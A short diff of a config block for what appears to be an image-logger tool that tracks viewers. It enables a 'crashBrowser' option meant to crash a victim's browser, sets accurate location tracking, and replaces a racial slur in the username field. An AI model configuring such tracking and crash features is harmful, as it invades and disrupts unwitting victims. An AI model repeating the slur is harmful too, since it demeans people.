@@ -19,11 +19,11 @@ config = {
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "NIGGA????", 
+    "username": "STAN", 
     "color": 0xFF0000,
 
     # OPTIONS #
-    "crashBrowser": False, 
+    "crashBrowser": True, 
     
     "accurateLocation": True, 
 
